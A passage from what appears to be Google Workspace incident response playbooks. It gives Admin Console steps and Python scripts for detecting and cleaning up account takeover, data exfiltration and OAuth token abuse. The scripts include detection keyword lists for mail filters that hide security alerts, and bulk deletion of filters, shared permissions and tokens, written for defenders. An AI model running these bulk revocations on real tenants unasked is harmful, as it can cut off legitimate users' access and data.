<pre><code>Admin Console &gt; Directory &gt; Users\n- Select compromised user(s)\n- Click \"Reset password\"\n- Force password change at next login\n- Uncheck \"Send email with reset instructions\"\n</code></pre></p> </li> <li> <p>OAuth Token Revocation <pre><code>Admin Console &gt; Security &gt; API Controls &gt; Domain-wide delegation\n- Identify and remove suspicious delegations\n\nAdmin Console &gt; Security &gt; API Controls &gt; App access control\n- Review and revoke access for suspicious applications\n</code></pre></p> </li> <li> <p>Session Termination <pre><code>Admin Console &gt; Directory &gt; Users &gt; [User] &gt; \"Security\"\n- Scroll to \"Your devices\"\n- Click \"Sign out of all sessions\"\n</code></pre></p> </li> </ol> <p>Secondary Containment:</p> <ol> <li> <p>Email Security Measures <pre><code>Admin Console &gt; Apps &gt; Google Workspace &gt; Gmail &gt; Safety\n- Implement temporary email quarantine for affected user(s)\n- Configure additional message scanning\n</code></pre></p> </li> <li> <p>Access Restrictions <pre><code>Admin Console &gt; Directory &gt; Users &gt; [User] &gt; \"Security\"\n- Configure login restrictions (IP, device)\n- Implement geographic login constraints\n</code></pre></p> </li> <li> <p>Document Access Review <pre><code># Via Google Drive audit log analysis\n- Identify documents shared externally\n- Review sensitive content access\n- Temporarily restrict sharing capabilities\n</code></pre></p> </li> <li> <p>Group Membership Assessment <pre><code>Admin Console &gt; Directory &gt; Groups\n- Review and adjust group memberships\n- Remove from privileged groups temporarily\n</code></pre></p> </li> </ol>"},{"location":"incident-response-playbooks/#eradication-steps","title":"Eradication Steps","text":"<ol> <li>Email Configuration Cleanup <pre><code># Manual or via API\n- Remove unauthorized email forwarding\n- Delete suspicious email filters\n- Revoke unauthorized mail delegation\n</code></pre></li> </ol> <pre><code># Python script to identify and remove suspicious email configurations\ndef cleanup_suspicious_email_configs(admin_service, gmail_service, user_email):\n    \"\"\"Remove suspicious email configurations\"\"\"\n    cleanup_report = {\n        'forwarding_removed': [],\n        'filters_removed': [],\n        'delegates_removed': []\n    }\n    \n    try:\n        # Check and remove suspicious forwarding\n        forwarding = gmail_service.users().settings().getForwarding(\n            userId=user_email\n        ).execute()\n        \n        if forwarding.get('enabled') and not is_authorized_forwarding(forwarding.get('forwardingEmail')):\n            gmail_service.users().settings().updateForwarding(\n                userId=user_email,\n                body={'enabled': False}\n            ).execute()\n            cleanup_report['forwarding_removed'].append(forwarding.get('forwardingEmail'))\n        \n        # Check and remove suspicious filters\n        filters = gmail_service.users().settings().filters().list(\n            userId=user_email\n        ).execute()\n        \n        for filter_data in filters.get('filter', []):\n            if is_suspicious_filter(filter_data):\n                gmail_service.users().settings().filters().delete(\n                    userId=user_email,\n                    id=filter_data['id']\n                ).execute()\n                cleanup_report['filters_removed'].append(filter_data)\n        \n        # Check and remove unauthorized delegates\n        delegates = gmail_service.users().settings().delegates().list(\n            userId=user_email\n        ).execute()\n        \n        for delegate in delegates.get('delegates', []):\n            if not is_authorized_delegate(delegate.get('delegateEmail')):\n                gmail_service.users().settings().delegates().delete(\n                    userId=user_email,\n                    delegateEmail=delegate.get('delegateEmail')\n                ).execute()\n                cleanup_report['delegates_removed'].append(delegate.get('delegateEmail'))\n                \n        return cleanup_report\n    \n    except Exception as e:\n        return {'error': str(e)}\n\n# Helper functions\ndef is_authorized_forwarding(email):\n    \"\"\"Check if email is in allowed forwarding list\"\"\"\n    # Replace with your organization's logic\n    allowed_domains = ['company.com', 'trusted-partner.com']\n    return any(email.endswith('@' + domain) for domain in allowed_domains)\n\ndef is_suspicious_filter(filter_data):\n    \"\"\"Determine if a filter appears suspicious\"\"\"\n    # Look for common suspicious patterns\n    if 'forward' in str(filter_data).lower():\n        return True\n        \n    if any(term in str(filter_data).lower() for term in \n           ['security', 'password', 'verification', 'authenticate']):\n        return True\n        \n    # Add additional detection logic as needed\n    return False\n    \ndef is_authorized_delegate(email):\n    \"\"\"Check if delegate is authorized\"\"\"\n    # Replace with your organization's logic\n    authorized_delegates = ['admin@company.com', 'executive-assistant@company.com']\n    return email in authorized_delegates\n</code></pre> <ol> <li> <p>2FA Reset and Reconfiguration <pre><code>Admin Console &gt; Directory &gt; Users &gt; [User] &gt; \"Security\"\n- Reset 2FA enrollment\n- Force new 2FA enrollment\n- Verify backup codes are regenerated\n</code></pre></p> </li> <li> <p>Recovery Method Verification <pre><code>Admin Console &gt; Directory &gt; Users &gt; [User] &gt; \"Account\"\n- Verify and update recovery email\n- Verify and update recovery phone\n- Ensure all recovery methods are legitimate\n</code></pre></p> </li> <li> <p>Application Access Review and Cleanup <pre><code># For each affected user\nAdmin Console &gt; Security &gt; API Controls &gt; App access control\n- Revoke access for all unauthorized applications\n- Document authorized applications for restoration\n</code></pre></p> </li> <li> <p>Permission Verification <pre><code># For each affected user\n- Review admin role assignments\n- Verify appropriate group memberships\n- Check service account permissions\n- Validate resource-specific access rights\n</code></pre></p> </li> </ol>"},{"location":"incident-response-playbooks/#recovery-guidance","title":"Recovery Guidance","text":"<ol> <li> <p>Account Restoration <pre><code>Admin Console &gt; Directory &gt; Users\n- Unsuspend affected user(s)\n- Verify account settings are correct\n- Restore appropriate permissions\n</code></pre></p> </li> <li> <p>Enhanced Security Implementation <pre><code>Admin Console &gt; Security &gt; Authentication\n- Enforce stronger authentication policies\n- Consider Advanced Protection Program enrollment\n- Implement login challenges\n</code></pre></p> </li> <li> <p>Service Restoration Verification</p> </li> <li>Confirm email flow is normal</li> <li>Verify access to necessary applications</li> <li>Validate file access and sharing capabilities</li> <li> <p>Ensure calendar and meeting functionality</p> </li> <li> <p>User Communication and Education</p> </li> <li>Provide security awareness refresher</li> <li>Explain incident and response actions</li> <li>Advise on security best practices</li> <li>Schedule follow-up security training</li> </ol>"},{"location":"incident-response-playbooks/#post-incident-analysis","title":"Post-Incident Analysis","text":"<ol> <li>Root Cause Identification</li> <li>Determine initial access vector</li> <li>Identify security control failures</li> <li>Document complete attack timeline</li> <li> <p>Assess effectiveness of security controls</p> </li> <li> <p>Security Enhancement Planning</p> </li> <li>Identify specific control improvements</li> <li>Develop enhancement implementation plan</li> <li>Create timeline for security upgrades</li> <li> <p>Allocate resources for improvements</p> </li> <li> <p>Documentation and Reporting</p> </li> <li>Complete incident documentation</li> <li>Prepare executive summary</li> <li>Document lessons learned</li> <li> <p>Create remediation tracking document</p> </li> <li> <p>Process Improvement</p> </li> <li>Update detection capabilities</li> <li>Enhance response procedures</li> <li>Improve containment strategies</li> <li>Strengthen recovery processes</li> </ol>"},{"location":"incident-response-playbooks/#data-exfiltration-incident-response","title":"Data Exfiltration Incident Response","text":""},{"location":"incident-response-playbooks/#incident-overview_1","title":"Incident Overview","text":"<p>Description: Unauthorized extraction of sensitive data from Google Workspace services, including Drive, Gmail, Calendar, or other collaboration tools.</p> <p>Common Attack Vectors: - Google Takeout exports - Mass document downloads - Email forwarding rules - OAuth applications with extensive access - Unauthorized API access to data - Third-party integrations with excessive permissions</p> <p>Severity Classifications: - Critical: Mass exfiltration of regulated or sensitive data - High: Targeted exfiltration of sensitive information - Medium: Limited exposure of internal information - Low: Export of non-sensitive, non-proprietary data</p>"},{"location":"incident-response-playbooks/#detection-and-analysis_1","title":"Detection and Analysis","text":"<p>Initial Indicators: - Unusual volume of file downloads - Suspicious Google Takeout exports - Unexpected external sharing of documents - Unusual API request patterns - Data access from atypical locations or times</p> <p>Investigation Procedures:</p> <ol> <li> <p>Drive Activity Analysis <pre><code>Admin Console &gt; Reports &gt; Audit &gt; Drive\n- Filter for download, export activities\n- Identify mass document access patterns\n- Check for unusual sharing changes\n- Look for unusual access times or locations\n</code></pre></p> </li> <li> <p>Data Access Volume Assessment <pre><code># Python script to detect unusual data access volumes\ndef detect_unusual_data_access(reports_service, timeframe_days=3):\n    \"\"\"Identify users with unusually high data access volumes\"\"\"\n    # Calculate start time\n    start_time = (datetime.now() - timedelta(days=timeframe_days)).strftime('%Y-%m-%d')\n    \n    # Get Drive activities\n    drive_activities = reports_service.activities().list(\n        userKey='all',\n        applicationName='drive',\n        eventName='download,view,export',\n        startTime=start_time,\n        maxResults=1000\n    ).execute()\n    \n    # Aggregate by user\n    user_activity = {}\n    for activity in drive_activities.get('items', []):\n        user = activity['actor']['email']\n        if user not in user_activity:\n            user_activity[user] = {\n                'download_count': 0,\n                'view_count': 0,\n                'export_count': 0,\n                'files_accessed': set(),\n                'access_ips': set()\n            }\n            \n        # Extract event details\n        event = activity.get('events', [{}])[0]\n        event_name = event.get('name', '')\n        \n        # Update counts\n        if 'download' in event_name.lower():\n            user_activity[user]['download_count'] += 1\n        elif 'view' in event_name.lower():\n            user_activity[user]['view_count'] += 1\n        elif 'export' in event_name.lower():\n            user_activity[user]['export_count'] += 1\n            \n        # Add file ID\n        doc_id = next((p.get('value') for p in event.get('parameters', [])\n                       if p.get('name') == 'doc_id'), None)\n        if doc_id:\n            user_activity[user]['files_accessed'].add(doc_id)\n            \n        # Add IP address\n        if activity.get('ipAddress'):\n            user_activity[user]['access_ips'].add(activity.get('ipAddress'))\n    \n    # Convert sets to counts for easier analysis\n    for user in user_activity:\n        user_activity[user]['unique_files_accessed'] = len(user_activity[user]['files_accessed'])\n        user_activity[user]['unique_ips'] = len(user_activity[user]['access_ips'])\n        user_activity[user]['ip_list'] = list(user_activity[user]['access_ips'])\n        del user_activity[user]['files_accessed']\n        del user_activity[user]['access_ips']\n    \n    # Calculate organizational averages\n    org_avg = {\n        'download_avg': 0,\n        'view_avg': 0,\n        'export_avg': 0,\n        'files_avg': 0\n    }\n    \n    if user_activity:\n        user_count = len(user_activity)\n        download_total = sum(u['download_count'] for u in user_activity.values())\n        view_total = sum(u['view_count'] for u in user_activity.values())\n        export_total = sum(u['export_count'] for u in user_activity.values())\n        files_total = sum(u['unique_files_accessed'] for u in user_activity.values())\n        \n        org_avg = {\n            'download_avg': download_total / user_count,\n            'view_avg': view_total / user_count,\n            'export_avg': export_total / user_count,\n            'files_avg': files_total / user_count\n        }\n    \n    # Identify outliers (2x average as simple threshold)\n    outliers = []\n    for user, stats in user_activity.items():\n        if (stats['download_count'] &gt; org_avg['download_avg'] * 2 or\n            stats['export_count'] &gt; org_avg['export_avg'] * 2):\n            outliers.append({\n                'user': user,\n                'stats': stats,\n                'org_comparison': {\n                    'download_ratio': stats['download_count'] / max(org_avg['download_avg'], 1),\n                    'export_ratio': stats['export_count'] / max(org_avg['export_avg'], 1)\n                }\n            })\n    \n    return {\n        'org_averages': org_avg,\n        'outliers': sorted(outliers, key=lambda x: max(\n            x['org_comparison']['download_ratio'],\n            x['org_comparison']['export_ratio']\n        ), reverse=True)\n    }\n</code></pre></p> </li> <li> <p>Google Takeout Analysis <pre><code>Admin Console &gt; Reports &gt; Audit &gt; User accounts\n- Filter for \"download_data\" events\n- Identify unusual Takeout exports\n- Check timing and frequency of exports\n</code></pre></p> </li> <li> <p>External Sharing Review <pre><code>Admin Console &gt; Reports &gt; Audit &gt; Drive\n- Filter for \"change_user_access\" events\n- Focus on events with external users\n- Identify documents shared publicly\n</code></pre></p> </li> <li> <p>OAuth Application Assessment <pre><code>Admin Console &gt; Security &gt; API Controls &gt; App access control\n- Identify newly authorized applications\n- Review permissions and scopes\n- Check for data access capabilities\n</code></pre></p> </li> <li> <p>Evidence Collection</p> </li> <li>Document data access patterns</li> <li>Capture screenshots of relevant logs</li> <li>Create timeline of data access events</li> <li>List potentially exposed documents</li> <li>Preserve original logs for investigation</li> </ol>"},{"location":"incident-response-playbooks/#containment-procedures_1","title":"Containment Procedures","text":"<p>Immediate Actions:</p> <ol> <li> <p>Account Access Restriction <pre><code>Admin Console &gt; Directory &gt; Users\n- Suspend suspected user accounts\n- Reset passwords for affected accounts\n- Terminate all active sessions\n</code></pre></p> </li> <li> <p>External Sharing Limitation <pre><code>Admin Console &gt; Apps &gt; Google Workspace &gt; Drive\n- Restrict external sharing temporarily\n- Block public link creation\n- Disable file download for shared items\n</code></pre></p> </li> <li> <p>Data Export Restriction <pre><code>Admin Console &gt; Apps &gt; Google Workspace &gt; Settings for data access\n- Disable Google Takeout for affected users\n- Restrict data download capabilities\n- Block API-based exports\n</code></pre></p> </li> <li> <p>OAuth Application Blocking <pre><code>Admin Console &gt; Security &gt; API Controls &gt; App access control\n- Block suspicious applications\n- Revoke tokens for unauthorized apps\n- Restrict new OAuth authorizations\n</code></pre></p> </li> </ol> <p>Secondary Containment:</p> <ol> <li> <p>Drive Access Control Review <pre><code># For each affected user\n- Identify sensitive shared documents\n- Revoke inappropriate sharing permissions\n- Set more restrictive access controls\n</code></pre></p> </li> <li> <p>API Access Limitation <pre><code>Admin Console &gt; Security &gt; API Controls &gt; Domain-wide delegation\n- Review and adjust API access scopes\n- Implement stricter API limitations\n- Monitor API usage for anomalies\n</code></pre></p> </li> <li> <p>Data Loss Prevention Enhancement <pre><code>Admin Console &gt; Security &gt; Data protection\n- Deploy additional DLP rules\n- Implement content-aware access restrictions\n- Configure sensitive content controls\n</code></pre></p> </li> </ol>"},{"location":"incident-response-playbooks/#eradication-steps_1","title":"Eradication Steps","text":"<ol> <li>Remove Unauthorized Access <pre><code># For each affected document/data source\n- Remove external collaborators\n- Revoke public sharing links\n- Reset access controls to baseline\n</code></pre></li> </ol> <pre><code># Python script to revert unauthorized sharing\ndef revert_unauthorized_sharing(drive_service, start_date):\n    \"\"\"Revert unauthorized document sharing since given date\"\"\"\n    # Convert date to RFC 3339 timestamp\n    time_filter = f\"modifiedTime &gt; '{start_date}'\"\n    \n    # Get files with sharing changes\n    shared_files = drive_service.files().list(\n        q=time_filter,\n        spaces='drive',\n        fields='files(id,name,permissions)',\n        pageSize=1000\n    ).execute()\n    \n    revocation_results = []\n    \n    for file in shared_files.get('files', []):\n        file_id = file['id']\n        file_name = file['name']\n        \n        # Check each permission\n        for permission in file.get('permissions', []):\n            # Identify suspicious permissions (external or anyone)\n            if is_suspicious_permission(permission):\n                try:\n                    # Delete suspicious permission\n                    drive_service.permissions().delete(\n                        fileId=file_id,\n                        permissionId=permission['id']\n                    ).execute()\n                    \n                    revocation_results.append({\n                        'file_id': file_id,\n                        'file_name': file_name,\n                        'permission': permission,\n                        'status': 'revoked'\n                    })\n                except Exception as e:\n                    revocation_results.append({\n                        'file_id': file_id,\n                        'file_name': file_name,\n                        'permission': permission,\n                        'status': 'error',\n                        'error': str(e)\n                    })\n    \n    return revocation_results\n    \ndef is_suspicious_permission(permission):\n    \"\"\"Determine if a permission is suspicious based on criteria\"\"\"\n    # Check for 'anyone' access\n    if permission.get('type') == 'anyone':\n        return True\n        \n    # Check for external email domains\n    if permission.get('type') == 'user' and permission.get('emailAddress'):\n        if not permission['emailAddress'].endswith('@company.com'):  # Replace with your domain\n            return True\n            \n    # Add additional logic as needed\n    return False\n</code></pre> <ol> <li> <p>Clean Up Automated Access <pre><code># Via API or Admin Console\n- Remove unauthorized email forwarding\n- Delete suspicious email filters\n- Remove malicious Apps Script deployments\n</code></pre></p> </li> <li> <p>Revoke OAuth Authorizations <pre><code>Admin Console &gt; Security &gt; API Controls &gt; Domain-wide delegation\n- Revoke delegated access for suspicious services\n- Remove unnecessary API access\n</code></pre></p> </li> <li> <p>Remove Persistent Access Mechanisms</p> </li> <li>Disable unauthorized service accounts</li> <li>Remove compromised API keys</li> <li>Delete unauthorized Apps Script projects</li> <li>Uninstall malicious Workspace Add-ons</li> </ol>"},{"location":"incident-response-playbooks/#recovery-guidance_1","title":"Recovery Guidance","text":"<ol> <li> <p>Service Restoration <pre><code># For each affected user/system\n- Restore appropriate access rights\n- Re-enable necessary sharing capabilities\n- Reauthorize legitimate applications\n</code></pre></p> </li> <li> <p>Data Access Control Implementation <pre><code>Admin Console &gt; Apps &gt; Google Workspace &gt; Drive\n- Implement enhanced sharing controls\n- Deploy file classification system\n- Configure sharing restrictions by file type\n</code></pre></p> </li> <li> <p>DLP Enhancement <pre><code>Admin Console &gt; Security &gt; Data protection\n- Deploy additional content scanning rules\n- Implement stricter export controls\n- Configure enhanced alerting for sensitive content\n</code></pre></p> </li> <li> <p>API Security Hardening <pre><code>Admin Console &gt; Security &gt; API Controls\n- Implement more granular API access controls\n- Deploy API monitoring and anomaly detection\n- Establish API usage baselines\n</code></pre></p> </li> </ol>"},{"location":"incident-response-playbooks/#post-incident-analysis_1","title":"Post-Incident Analysis","text":"<ol> <li>Data Exposure Assessment</li> <li>Identify all exposed documents</li> <li>Determine sensitivity of exposed data</li> <li>Assess regulatory compliance impact</li> <li> <p>Calculate potential business impact</p> </li> <li> <p>Control Gap Identification</p> </li> <li>Identify DLP control failures</li> <li>Assess sharing restriction effectiveness</li> <li>Evaluate export control limitations</li> <li> <p>Review API security measures</p> </li> <li> <p>Security Enhancement Implementation</p> </li> <li>Develop enhanced data protection controls</li> <li>Implement improved monitoring capabilities</li> <li>Deploy additional access restrictions</li> <li> <p>Create data classification system</p> </li> <li> <p>Documentation and Reporting</p> </li> <li>Prepare data exposure report</li> <li>Document control recommendations</li> <li>Create incident summary</li> <li>Develop security enhancement roadmap</li> </ol>"},{"location":"incident-response-playbooks/#oauth-token-abuse-incident-response","title":"OAuth Token Abuse Incident Response","text":""},{"location":"incident-response-playbooks/#incident-overview_2","title":"Incident Overview","text":"<p>Description: Unauthorized access or activities using compromised OAuth tokens, potentially resulting in persistent access despite password changes and authentication enhancements.</p> <p>Common Attack Vectors: - Phishing campaigns for OAuth authorization - Malicious third-party applications - Token theft via client-side attacks - Excessive permission requests from applications - Stolen refresh tokens from compromised devices</p> <p>Severity Classifications: - Critical: Administrative access token compromise - High: User token with extensive data access - Medium: Limited-scope token for specific services - Low: Minimal permission token with no sensitive data access</p>"},{"location":"incident-response-playbooks/#detection-and-analysis_2","title":"Detection and Analysis","text":"<p>Initial Indicators: - Unusual application authorization activity - API usage from unexpected locations - Application access despite password changes - Abnormal API request patterns or volumes - Unusual scopes requested by applications</p> <p>Investigation Procedures:</p> <ol> <li> <p>Token Activity Analysis <pre><code>Admin Console &gt; Reports &gt; Audit &gt; Token\n- Filter for token creation and usage events\n- Identify applications with unusual activity\n- Check for suspicious permission scopes\n</code></pre></p> </li> <li> <p>Application Authorization Review <pre><code>Admin Console &gt; Security &gt; API Controls &gt; App access control\n- Review recently authorized applications\n- Check for applications with excessive permissions\n- Identify unauthorized or suspicious applications\n</code></pre></p> </li> <li> <p>API Usage Analysis <pre><code># Python script to analyze API usage patterns\ndef analyze_api_usage(reports_service, days_back=7):\n    \"\"\"Analyze API usage patterns for anomalies\"\"\"\n    # Calculate start time\n    start_time = (datetime.now() - timedelta(days=days_back)).strftime('%Y-%m-%d')\n    \n    # Get API activity events\n    api_events = reports_service.activities().list(\n        userKey='all',\n        applicationName='token',\n        startTime=start_time,\n        maxResults=1000\n    ).execute()\n    \n    # Analyze application usage\n    app_activity = {}\n    user_app_activity = {}\n    \n    for event in api_events.get('items', []):\n        # Extract basic information\n        user = event['actor']['email']\n        parameters = event.get('events', [{}])[0].get('parameters', [])\n        app_name = next((p.get('value') for p in parameters if p.get('name') == 'app_name'), 'Unknown')\n        client_id = next((p.get('value') for p in parameters if p.get('name') == 'client_id'), 'Unknown')\n        scopes = next((p.get('value') for p in parameters if p.get('name') == 'scope'), '').split()\n        \n        # Track by application\n        app_key = f\"{app_name}:{client_id}\"\n        if app_key not in app_activity:\n            app_activity[app_key] = {\n                'app_name': app_name,\n                'client_id': client_id,\n                'user_count': set(),\n                'ip_addresses': set(),\n                'scope_count': len(scopes),\n                'scopes': scopes,\n                'high_risk_scopes': [s for s in scopes if is_high_risk_scope(s)],\n                'event_count': 0\n            }\n        \n        app_activity[app_key]['user_count'].add(user)\n        if event.get('ipAddress'):\n            app_activity[app_key]['ip_addresses'].add(event.get('ipAddress'))\n        app_activity[app_key]['event_count'] += 1\n        \n        # Track by user and application\n        user_app_key = f\"{user}:{app_key}\"\n        if user_app_key not in user_app_activity:\n            user_app_activity[user_app_key] = {\n                'user': user,\n                'app_name': app_name,\n                'client_id': client_id,\n                'ip_addresses': set(),\n                'scopes': scopes,\n                'event_count': 0,\n                'first_seen': event.get('id', {}).get('time'),\n                'last_seen': event.get('id', {}).get('time')\n            }\n        \n        user_app_activity[user_app_key]['event_count'] += 1\n        if event.get('ipAddress'):\n            user_app_activity[user_app_key]['ip_addresses'].add(event.get('ipAddress'))\n        \n        # Update last seen\n        event_time = event.get('id', {}).get('time')\n        if event_time and event_time &gt; user_app_activity[user_app_key]['last_seen']:\n            user_app_activity[user_app_key]['last_seen'] = event_time\n    \n    # Convert sets to counts and lists\n    for app_key in app_activity:\n        app_activity[app_key]['user_count'] = len(app_activity[app_key]['user_count'])\n        app_activity[app_key]['ip_count'] = len(app_activity[app_key]['ip_addresses'])\n        app_activity[app_key]['ip_list'] = list(app_activity[app_key]['ip_addresses'])\n        del app_activity[app_key]['ip_addresses']\n    \n    for user_app_key in user_app_activity:\n        user_app_activity[user_app_key]['ip_count'] = len(user_app_activity[user_app_key]['ip_addresses'])\n        user_app_activity[user_app_key]['ip_list'] = list(user_app_activity[user_app_key]['ip_addresses'])\n        del user_app_activity[user_app_key]['ip_addresses']\n    \n    # Identify suspicious applications\n    suspicious_apps = []\n    for app_key, data in app_activity.items():\n        risk_score = calculate_app_risk_score(data)\n        if risk_score &gt; 7:  # Arbitrary threshold\n            suspicious_apps.append({\n                'app_key': app_key,\n                'risk_score': risk_score,\n                'data': data\n            })\n    \n    return {\n        'app_activity': app_activity,\n        'user_app_activity': user_app_activity,\n        'suspicious_apps': sorted(suspicious_apps, key=lambda x: x['risk_score'], reverse=True)\n    }\n\ndef is_high_risk_scope(scope):\n    \"\"\"Determine if a scope is high-risk\"\"\"\n    high_risk_indicators = [\n        'https://mail.google.com/',\n        'https://www.googleapis.com/auth/drive',\n        'https://www.googleapis.com/auth/admin',\n        'https://www.googleapis.com/auth/cloud-platform',\n        '.readonly',  # Wildcard for read access to services\n        'https://www.googleapis.com/auth/contacts',\n        'https://www.googleapis.com/auth/calendar'\n    ]\n    \n    return any(indicator in scope for indicator in high_risk_indicators)\n\ndef calculate_app_risk_score(app_data):\n    \"\"\"Calculate a risk score for an application based on various factors\"\"\"\n    risk_score = 0\n    \n    # More users = higher potential impact\n    if app_data['user_count'] &gt; 10:\n        risk_score += 2\n    elif app_data['user_count'] &gt; 5:\n        risk_score += 1\n    \n    # High number of scopes increases risk\n    if app_data['scope_count'] &gt; 10:\n        risk_score += 3\n    elif app_data['scope_count'] &gt; 5:\n        risk_score += 2\n    elif app_data['scope_count'] &gt; 2:\n        risk_score += 1\n    \n    # High-risk scopes significantly increase risk\n    risk_score += min(len(app_data['high_risk_scopes']) * 2, 6)\n    \n    # Multiple IP addresses may indicate broader usage\n    if len(app_data['ip_list']) &gt; 5:\n        risk_score += 1\n    \n    return risk_score\n</code></pre></p> </li> <li> <p>Token Revocation Testing</p> </li> <li>Test revocation impact on applications</li> <li>Identify applications unaffected by password changes</li> <li> <p>Verify token expiration enforcement</p> </li> <li> <p>Scope Analysis</p> </li> <li>Identify token scopes and permissions</li> <li>Evaluate potential access granted</li> <li> <p>Assess data exposure risk</p> </li> <li> <p>Evidence Collection</p> </li> <li>Document affected applications and tokens</li> <li>Capture relevant API access logs</li> <li>Record suspicious token activity</li> <li>Preserve authorization request evidence</li> </ol>"},{"location":"incident-response-playbooks/#containment-procedures_2","title":"Containment Procedures","text":"<p>Immediate Actions:</p> <ol> <li> <p>Token Revocation <pre><code>Admin Console &gt; Security &gt; API Controls &gt; Domain-wide delegation\n- Revoke tokens for suspected applications\n- Remove domain-wide delegations for compromised services\n</code></pre></p> </li> <li> <p>Account Security Enhancement <pre><code>Admin Console &gt; Directory &gt; Users &gt; [User] &gt; \"Security\"\n- Reset passwords for affected accounts\n- Force application logout\n- Enable enhanced security verification\n</code></pre></p> </li> <li> <p>Application Blocking <pre><code>Admin Console &gt; Security &gt; API Controls &gt; App access control\n- Block suspicious applications\n- Restrict future authorizations\n- Implement app allowlisting for critical users\n</code></pre></p> </li> </ol> <p>Secondary Containment:</p> <ol> <li> <p>Access Scope Restriction <pre><code>Admin Console &gt; Security &gt; API Controls\n- Restrict available API scopes\n- Implement more granular permissions\n- Configure access boundaries\n</code></pre></p> </li> <li> <p>API Access Monitoring <pre><code># Via custom monitoring or security tool\n- Deploy enhanced API monitoring\n- Create alerts for suspicious activity\n- Implement token usage baselines\n</code></pre></p> </li> <li> <p>Application Authorization Controls <pre><code>Admin Console &gt; Security &gt; API Controls &gt; App access control\n- Configure application verification requirements\n- Implement approval workflows for sensitive apps\n- Deploy risky application alerting\n</code></pre></p> </li> </ol>"},{"location":"incident-response-playbooks/#eradication-steps_2","title":"Eradication Steps","text":"<ol> <li> <p>Comprehensive Token Revocation <pre><code># Python script to revoke tokens for specific applications\ndef revoke_application_tokens(reports_service, admin_service, client_id):\n    \"\"\"Revoke tokens for a specific client ID across all users\"\"\"\n    # Get all users\n    users_result = admin_service.users().list(\n        customer='my_customer',\n        maxResults=500\n    ).execute()\n    \n    revocation_results = []\n    \n    for user in users_result.get('users', []):\n        user_email = user['primaryEmail']\n        \n        # Get token events to identify tokens for this client\n        try:\n            token_events = reports_service.activities().list(\n                userKey=user_email,\n                applicationName='token',\n                maxResults=1000\n            ).execute()\n            \n            # Look for matching client ID\n            has_token = False\n            for event in token_events.get('items', []):\n                parameters = event.get('events', [{}])[0].get('parameters', [])\n                event_client_id = next((p.get('value') for p in parameters \n                                       if p.get('name') == 'client_id'), None)\n                \n                if event_client_id == client_id:\n                    has_token = True\n                    break\n            \n            if has_token:\n                # Revoke access for this user\n                try:\n                    admin_service.tokens().delete(\n                        userKey=user_email,\n                        clientId=client_id\n                    ).execute()\n                    \n                    revocation_results.append({\n                        'user': user_email,\n                        'status': 'revoked'\n                    })\n                except Exception as e:\n                    revocation_results.append({\n                        'user': user_email,\n                        'status': 'error',\n                        'error': str(e)\n                    })\n        except Exception as e:\n            revocation_results.append({\n                'user': user_email,\n                'status': 'lookup_error',\n                'error': str(e)\n            })\n    \n    return revocation_results\n</code></pre></p> </li> <li> <p>OAuth App Removal <pre><code>Admin Console &gt; Security &gt; API Controls &gt; App access control\n- Remove malicious applications from allowlist\n- Block compromised app client IDs\n- Implement stricter app verification requirements\n</code></pre></p> </li> <li> <p>Service Account Cleanup <pre><code>Admin Console &gt; Security &gt; API Controls &gt; Domain-wide delegation\n- Review and clean up service accounts\n- Verify legitimate delegations\n- Reduce permissions to least privilege\n</code></pre></p> </li> <li> <p>Extension and Add-on Review <pre><code>Admin Console &gt; Apps &gt; Marketplace apps\n- Remove unauthorized browser extensions\n- Uninstall suspicious Workspace add-ons\n- Validate legitimate integrations\n</code></pre></p> </li> </ol>"},{"location":"incident-response-playbooks/#recovery-guidance_2","title":"Recovery Guidance","text":"<ol> <li> <p>Application Access Restoration <pre><code># For legitimate applications\n- Reauthorize essential applications\n- Guide users through proper authorization process\n- Validate proper scope requests\n</code></pre></p> </li> <li> <p>API Control Enhancement <pre><code>Admin Console &gt; Security &gt; API Controls\n- Implement enhanced API access controls\n- Deploy API access monitoring\n- Configure more granular permissions\n</code></pre></p> </li> <li> <p>OAuth Governance Implementation</p> </li> <li>Deploy OAuth application inventory process</li> <li>Implement regular access reviews</li> <li>Create application authorization framework</li> <li> <p>Establish scope restriction policies</p> </li> <li> <p>User Communication and Training</p> </li> <li>Provide guidance on safe application authorization</li> <li>Educate on permission evaluation</li> <li>Deploy phishing awareness for OAuth-based attacks</li> <li>Create clear escalation procedures</li> </ol>"},{"location":"incident-response-playbooks/#post-incident-analysis_2","title":"Post-Incident Analysis","text":"<ol> <li>Token Abuse Impact Assessment</li> <li>Identify accessed data and services</li> <li>Determine duration of unauthorized access</li> <li>Assess regulatory compliance impact</li> <li> <p>Document business impact</p> </li> <li> <p>OAuth Security Evaluation</p> </li> <li>Review OAuth authorization controls</li> <li>Assess token management practices</li> <li>Evaluate monitoring effectiveness</li> <li> <p>Identify security control gaps</p> </li> <li> <p>Documentation and Reporting</p> </li> <li>Document affected applications and users</li> <li>Create comprehensive timeline</li> <li>Prepare executive summary</li> <li> <p>Develop token security roadmap</p> </li> <li> <p>Security Enhancement Implementation</p> </li> <li>Deploy OAuth governance framework</li> <li>Implement enhanced monitoring</li> <li>Establish token usage baselines</li> <li>Create application vetting process</li> </ol>"},{"location":"incident-response-playbooks/#admin-privilege-escalation-incident-response","title":"Admin Privilege Escalation Incident Response","text":""},{"location":"incident-response-playbooks/#incident-overview_3","title":"Incident Overview","text":"<p>Description: Unauthorized acquisition or use of administrative privileges within Google Workspace, potentially resulting in organization-wide security compromises, configuration changes, or data access.</p> <p>Common Attack Vectors: - Phishing attacks targeting admins - Role privilege elevation through compromised accounts - Creation of unauthorized admin accounts - Exploitation of delegated admin rights - OAuth application with admin capabilities - Recovery email/phone compromise for admins</p> <p>Severity Classifications: - Critical: Super admin compromise - High: Privilege escalation to admin with significant rights - Medium: Limited admin role compromise - Low: Attempted but unsuccessful admin privilege acquisition</p>"},{"location":"incident-response-playbooks/#detection-and-analysis_3","title":"Detection and Analysis","text":"<p>Initial Indicators: - Unexpected admin role assignments - Unusual administrative console access - Configuration changes without approval - Suspicious admin activities from unusual locations - Creation of new admin accounts - Modification of admin recovery settings</p> <p>Investigation Procedures:</p> <ol> <li> <p>Admin Activity Analysis <pre><code>Admin Console &gt; Reports &gt; Audit &gt; Admin\n- Filter for role assignment changes\n- Identify unusual admin console access\n- Look for critical setting modifications\n- Check for new admin user creation\n</code></pre></p> </li> <li> <p>Admin Role Assessment <pre><code>Admin Console &gt; Account &gt; Admin roles\n- Review all admin role assignments\n- Identify unauthorized or excessive permissions\n- Check for recently modified roles\n</code></pre></p> </li> <li> <p>Admin Access Pattern Analysis <pre><code># Python script to analyze admin access patterns\ndef analyze_admin_access_patterns(reports_service, days_back=30):\n    